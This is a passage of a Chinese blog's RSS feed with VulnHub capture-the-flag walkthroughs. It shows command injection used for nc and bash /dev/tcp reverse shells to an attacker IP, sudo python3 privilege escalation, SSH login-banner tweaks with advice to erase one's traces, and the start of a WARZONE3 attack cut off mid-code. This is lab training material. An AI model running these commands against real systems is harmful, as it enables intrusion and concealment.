-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1214.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;凭借凭据 jehad 拿到了靶机上一个普通用户的权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1215.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看靶机上有没有开放特殊的端口&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1216.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;curl-测试网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-测试网站&#34;&gt;#&lt;/a&gt; curl 测试网站&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当然也可以通过 curl 命令在这台 linux 机器上直接访问此网站&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;code&gt;curl -vv 127.0.0.1:9999&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1217.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞；执行系统命令，看当前这个网站是属于哪个用户下的&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;curl 127.0.0.1:9999?cmd=id;echo &#39;&#39;&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;echo &#39;&#39;&lt;/code&gt;  的作用使回显比较美观一些，没有实际的作用&lt;br&gt;
-得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹&lt;br&gt;
-判断 losy 是否可以使用 nc 命令反弹 shell&lt;br&gt;
- &lt;code&gt;curl 127.0.0.1:9999?cmd=which%20nc;echo &#39;&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1218.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;使用 nc 反弹 shell，并在 kali 上进行监听&lt;br&gt;
- &lt;code&gt;curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo &#39;&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1219.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27&lt;/code&gt; &lt;br&gt;
- 采用的命令即是： &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 99 /4444 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1220.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;调整为标准终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调整为标准终端&#34;&gt;#&lt;/a&gt; 调整为标准终端&lt;/h3&gt;
-&lt;p&gt;调整为一个标准的 tty 终端&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;__import__(&amp;#x27;pty&amp;#x27;).spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1221.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整TERM、&lt;span class=&#34;built_in&#34;&gt;stty&lt;/span&gt;的窗口大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty rows 31 columns 118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1222.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;此刻的我们已经拿到了 losy 用户的 shell&lt;/p&gt;
-&lt;h3 id=&#34;历史遗留信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#历史遗留信息&#34;&gt;#&lt;/a&gt; 历史遗留信息&lt;/h3&gt;
-&lt;p&gt;在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1223.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1224.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;由此造成了 9999 端口处的命令执行漏洞&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1225.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码，发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1226.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;通过 &lt;code&gt;sudo -l&lt;/code&gt;  查到了一条隐私设置错误的记录&lt;br&gt;
- `sudo -u root python3 -c “&lt;strong&gt;import&lt;/strong&gt;(‘os’).system(’/bin/bash’)”``&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1227.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 提权成功拿到了 root 权限&lt;/p&gt;
-&lt;h3 id=&#34;ssh-显示系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-显示系统信息&#34;&gt;#&lt;/a&gt; ssh 显示系统信息&lt;/h3&gt;
-&lt;p&gt;对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1228.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后登陆到此服务器的时间和 ip&lt;/p&gt;
-&lt;p&gt;上边的信息来自来自 /run/motd.dynamic 文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1229.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这个文件的信息无法修改，哪怕被清空了也会复原。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1230.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。&lt;br&gt;
- &lt;code&gt;chmod -x /etc/update-motd.d/*;echo &amp;gt; /run/motd.dynamic;&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1231.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息开启 linux 系统信息展示： &lt;code&gt;chmod +x /etc/update-motd.d/*&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;ssh-最后登录ip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-最后登录ip&#34;&gt;#&lt;/a&gt; ssh 最后登录 ip&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：&lt;br&gt;
- &lt;code&gt;sed -i &#39;s/#PrintLastLog yes/PrintLastLog no/g&#39; /etc/ssh/sshd_config;systemctl restart sshd&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1232.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登陆的情况出现，开启最后登陆的日志命令如下：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1233.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;ssh-登录时logo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-登录时logo&#34;&gt;#&lt;/a&gt; ssh 登录时 logo&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=&#34;&gt;https://www.bootschool.net/ascii 上进行字母的图形编码&lt;/span&gt;&lt;br&gt;
-开启 linux 登陆 logo 提示：&lt;br&gt;
- &lt;code&gt;echo -e &#39;\n\n\t\t██╗ ██╗ ████████╗\n\t\t╚██╗██╔╝ ╚══██╔══╝\n\t\t ╚███╔╝ ██║ \n\t\t ██╔██ ╗ ██║ \n\t\t██╔╝ ██╗███████╗██║ \n\t\t ╚═╝ ╚═╝╚══════╝╚═╝\n&#39; &amp;gt; /etc/motd&lt;/code&gt; &lt;br&gt;
--e 表示开启转义 \n 表示换行 \t 表示 tab 按键&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1234.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;关闭这个 logo 提示，只需要将 /etc/motd 清空就可以&lt;br&gt;
- &lt;code&gt;echo &amp;gt; /etc/motd;vim /etc/motd +&amp;quot;d 1 &amp;quot; +wq&lt;/code&gt;  会有一个空格&lt;br&gt;
- &lt;code&gt;cat /dev/null &amp;gt; /etc/motd&lt;/code&gt;  没有任何东西，直接清空文件&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1235.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制&lt;br&gt;
- &lt;code&gt;sed -i &#39;s/#Banner none/Banner \/etc\/issue.net/g&#39; /etc/ssh/sshd_config;systemctl restart sshd; echo -e &#39;\n\t\t███████╗██╗ ██╗██╗ ██╗\n\t\t╚══███╔╝╚██╗ ██╔╝██║ ██║\n\t\t ███╔╝ ╚████╔╝ ███████║\n\t\t ███╔╝ ╚██╔╝ ██╔══██║\n\t\t███████╗ ██║ ██║ ██║\n\t\t╚══════╝ ╚═╝ ╚═╝ ╚═╝&#39; &amp;gt; /etc/issue.net&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1236.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆前显示的，/etc/issue.net 的作用就是登陆前显示信息&lt;br&gt;
-将登陆后的信息也显示一下进行对比就更容易理解执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1237.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后&lt;br&gt;
-一键关闭登陆前的信息展示&lt;br&gt;
- &lt;code&gt;sed -i &#39;s/Banner \/etc\/issue.net/#Banner none/g&#39; /etc/ssh/sshd_config;systemctl restart sshd;echo &amp;gt; /etc/issue.net&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1238.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;ssh-自定义登录文字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-自定义登录文字&#34;&gt;#&lt;/a&gt; ssh 自定义登录文字&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到 shell 后就会执行&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在环境变量里边添加figlet表示以一种方式去打印后面跟的字母或者数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; ~/.bashrc &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figlet I\&amp;#x27;m X_T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查这个文件是否完整的写入到了环境变量里边&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.bashrc | tail -n1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1239.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;vim ~/.bashrcs 删除此条信息则不会在显示这条&lt;/p&gt;
-&lt;h3 id=&#34;一键删除登录信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一键删除登录信息&#34;&gt;#&lt;/a&gt; 一键删除登录信息&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都再不会被显示出来&lt;br&gt;
- for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do touch /home/$USER/.hushlogin;done;touch /root/.hushlogin&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1240.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;一键删除阻碍登陆日志信息输出的文件：&lt;br&gt;
-for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do rm -f /home/$USER/.hushlogin;done;rm -f /root/.hushlogin&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1241.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复原，并且删除自己操作过的痕迹，防止被知道自己操作过什么。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/</guid>
-            <title>VULNHUB 47 WARZONE3</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/</link>
-            <category>VULNHUB 41-50</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0zLWV4b2dlbiw2MDYv&#34;&gt;https://www.vulnhub.com/entry/warzone-3-exogen,606/&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
- 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
-由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;开靶机前后各扫描一次，得到靶机 ip 192.168.0.186&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1432.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;2 ）扫描靶机上开放的端口及详细信息&lt;br&gt;
- &lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1433.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;nmap 参数说明&lt;br&gt;
- - sV 表示扫描服务及版本信息&lt;br&gt;
- - sC 表示以默认的脚本进行扫描&lt;br&gt;
- - T4 表示控制扫描的速度&lt;br&gt;
- - Pn 表示不用 ping 去扫描机器&lt;br&gt;
-–open 表示只扫描开放的端口&lt;br&gt;
- - p- 表示扫描所有的端口&lt;br&gt;
-–min-rate 设置最小的扫描速度&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blockquote&gt;
-&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
-21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
- 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
- 4444 krb 524 ：未知端口&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; FTP 匿名访问&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=&#34;&gt;ftp://192.168.0.186/&lt;/span&gt; 进行 ftp 信息收集&lt;br&gt;
-有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1434.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来控制本地的目录&lt;/p&gt;
-&lt;p&gt;note.txt 中提示 token 是 username 的 SHA 256 值，并且有一个邮箱是 alienum@exogenesis，即用户为 alienum&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1435.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;java代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码审计&#34;&gt;#&lt;/a&gt; java 代码审计&lt;/h3&gt;
-&lt;p&gt;将下载后的 jar 文件，用 jd-gui 打开后查看源代码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1436.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转变为字符串、get set 方法等&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1437.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;Token 由 value 和 role 组成&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1438.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1439.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识别不到 url 地址为 warzone.local&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1440.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1441.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来说就应该是 alienum 用户的 TOKEN 值&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1442.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256&lt;br&gt;
- &lt;code&gt;echo -n &amp;quot;alienum&amp;quot; | shasum -a 256&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1443.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&lt;/p&gt;
-&lt;p&gt;再次用 alienum 用户和他的 token 登陆发现爆了错误&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1444.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA 其他的两个文件不变，主函数改为下面的代码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1445.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package alien;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.ObjectInputStream;&lt;/span&gt;&lt;br&gt;&lt;span 